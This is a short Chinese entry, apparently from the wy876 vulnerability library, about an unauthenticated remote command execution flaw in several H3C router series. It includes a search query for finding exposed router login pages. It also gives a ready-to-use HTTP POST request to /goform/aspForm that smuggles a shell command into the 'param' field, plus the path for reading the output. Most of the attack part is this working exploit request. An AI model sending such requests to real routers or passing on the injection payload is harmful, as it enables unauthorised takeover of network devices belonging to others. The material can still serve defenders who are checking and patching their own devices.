---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# H3C多系列路由器存在前台远程命令执行漏洞

# 一、漏洞简介
 H3C多系列路由器存在前台远程命令执行漏洞。

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ hunter`app.name="H3C Router Management"`
+ 登录页面


# 四、漏洞复现
```java
POST /goform/aspForm HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Host: 

CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
```


```java
/test
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tp0a94dpgkk64aqo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
